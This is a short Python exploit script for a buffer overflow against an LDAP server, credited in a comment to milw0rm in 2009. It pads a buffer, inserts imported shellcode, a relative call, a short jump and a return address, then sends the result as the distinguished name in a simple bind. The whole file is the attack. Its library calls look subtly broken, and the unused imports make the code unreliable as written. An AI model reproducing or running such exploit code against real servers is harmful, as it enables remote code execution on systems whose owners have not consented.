#!/usr/bin/python

import ldap3

import socket
from payload import buf

import struct
def shell_attack(target_machine, target_port):
	sploit =  b"\x41"*1028
	sploit += b"SKH"	#Trick track  ;) 
	sploit += buf
	sploit += b"\x44"*(3299-len(buf))
	sploit += b"\xE8\x18\xF3\xFF\xFF"
	sploit += b"\x44"*5
	sploit += b"\xEB\xF4\x90\x90"
	sploit += b"\x29\x10\x40"	#univ ret
	l = ldap3.Connection.request(target_machine)
	l.simple_bind(b"dc=" +sploit, b"\x42" * 256)


	# milw0rm.com [2009-09-09]